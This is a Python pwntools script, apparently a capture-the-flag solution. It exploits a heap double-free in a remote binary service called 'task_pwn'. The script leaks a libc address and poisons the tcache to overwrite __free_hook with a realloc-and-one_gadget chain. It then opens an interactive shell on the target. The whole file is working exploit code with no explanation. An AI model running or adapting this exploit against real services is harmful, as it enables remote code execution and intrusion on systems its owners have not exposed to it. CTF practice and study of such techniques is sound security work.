#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./task_pwn')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('121.37.10.245', 2333)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./task_pwn', checksec=False)
libc_one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]


def add(add_size, add_input):
    p.sendlineafter('Input your choice:', '1')
    p.sendlineafter('Please input the size of story: \n', str(add_size))
    p.sendafter('please inpute the story: \n', add_input)


def delete(delete_idx):
    p.sendlineafter('Input your choice:', '4')
    p.sendlineafter('Please input the index:\n', str(delete_idx))


# gdb.attach(p, "b *$rebase(0xD78)\nc")
p.sendlineafter("What's your name?\n", '')
p.sendlineafter('Please input your ID.\n', '')

addr_setbuffer = u64(p.recv(6).ljust(8, '\x00')) - 186
libcbase = addr_setbuffer - libc.sym['setbuffer']
addr___free_hook = libcbase + libc.sym['__free_hook']
addr___libc_realloc = libcbase + libc.sym['__libc_realloc']
addr_one_gadget = libcbase + libc_one_gadget[1]

add(0x20, 'aaaa')
add(0x20, 'bbbb')
delete(0)
delete(0)
add(0x20, p64(addr___free_hook - 8))
add(0x20, p64(addr___free_hook - 8))
add(0x20, p64(addr___libc_realloc) + p64(addr_one_gadget))
# gdb.attach(p)
p.sendlineafter('Input your choice:', '4')
p.sendlineafter('Please input the index:\n', '0')
success('addr_setbuffer      = ' + hex(addr_setbuffer))
success('libcbase            = ' + hex(libcbase))
success('addr___free_hook  = ' + hex(addr___free_hook))
success('addr_one_gadget     = ' + hex(addr_one_gadget))
success('addr___libc_realloc = ' + hex(addr___libc_realloc))
p.interactive()
